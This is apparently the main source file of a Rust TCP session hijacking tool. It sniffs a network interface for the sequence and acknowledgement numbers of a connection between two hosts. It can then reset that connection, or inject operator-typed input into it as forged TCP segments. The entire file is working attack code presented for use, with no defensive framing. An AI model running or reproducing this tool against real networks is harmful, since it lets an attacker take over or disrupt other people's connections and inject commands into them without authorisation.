use env_logger::Env;
use rshijack::args::Args;
use rshijack::errors::*;
use rshijack::net::{self, TcpFlags};
use std::io::{self, Read};
use std::thread;
use structopt::StructOpt;

fn main() -> Result<()> {
    let args = Args::from_args();

    let log_level = if args.quiet == 0 {
        "rshijack=debug"
    } else {
        "warn"
    };

    env_logger::init_from_env(Env::default().default_filter_or(log_level));

    trace!("arguments: {:?}", args);

    eprintln!("Waiting for SEQ/ACK to arrive from the srcip to the dstip.");
    eprintln!("(To speed things up, try making some traffic between the two, /msg person asdf)");

    let mut connection = if let (Some(seq), Some(ack)) = (args.seq, args.ack) {
        eprintln!("[+] Using SEQ = 0x{:x}, ACK = 0x{:x}", seq, ack);
        net::Connection::new(args.src, args.dst, seq, ack)
    } else {
        let c = net::getseqack(&args.interface, &args.src, &args.dst)?;
        eprintln!(
            "[+] Got packet! SEQ = 0x{:x}, ACK = 0x{:x}",
            c.get_seq(),
            c.get_ack()
        );
        c
    };

    let (mut tx, _rx) = net::create_socket()?;

    if args.reset {
        connection.reset(&mut tx)?;
        eprintln!("[+] Connection has been reset");
        return Ok(());
    }

    {
        let mut connection = connection.clone();
        let interface = args.interface.clone();

        // args are flipped for receiving
        let dst = connection.src;
        let src = connection.dst;

        let (mut tx, _rx) = net::create_socket()?;

        let _recv = thread::spawn(move || {
            net::recv(&mut tx, &interface, &mut connection, &src, &dst).unwrap();
        });
    }

    if args.send_null {
        info!("Sending 1kb of null bytes to prevent desync");

        let data = vec![0; 1024];
        connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::PSH, &data)?;
    }

    eprintln!("Starting hijack session, Please use ^D to terminate.");
    eprintln!("Anything you enter from now on is sent to the hijacked TCP connection.");

    let mut stdin = io::stdin();
    let mut data = vec![0; 512];
    loop {
        let len = stdin.read(&mut data)?;

        if len == 0 {
            break;
        }

        connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::PSH, &data[..len])?;
    }

    connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::FIN, &[])?;
    eprintln!("Exiting..");

    Ok(())
}
